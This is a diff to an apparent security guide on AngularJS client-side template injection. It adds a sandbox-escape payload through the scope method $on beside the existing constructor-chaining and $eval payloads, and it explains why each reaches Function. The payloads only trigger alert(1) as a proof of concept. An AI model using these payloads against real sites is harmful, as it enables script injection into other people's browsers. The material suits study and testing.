@@ -24,7 +24,10 @@ Called **client-side template injection (CSTI)**.
 AngularJS runs expressions in a sandboxed scope — `window`, `alert`, and direct code execution are not accessible. Use constructor chaining to reach `Function`:
 
 ```javascript
-// Universal — works across AngularJS versions
+// Via $on (AngularJS scope method — already a function, one hop to Function)
+{{$on.constructor('alert(1)')()}}
+
+// Via constructor chain (starts from string/object, two hops to Function)
 {{constructor.constructor('alert(1)')()}}
 
 // Via $eval (older versions)
@@ -34,6 +37,8 @@ AngularJS runs expressions in a sandboxed scope — `window`, `alert`, and direc
 **Why constructor chaining works:**
 - Every JS object has `.constructor` pointing to its creating function
 - A string's constructor is `String`; `String`'s constructor is `Function`
+- A function's constructor *is* `Function` directly (one hop instead of two)
+- `$on` is an Angular scope method — already a function, so `$on.constructor` = `Function` immediately
 - `Function('alert(1)')` creates a new function from a string and executes it
 - No `<>` or `window` needed
 
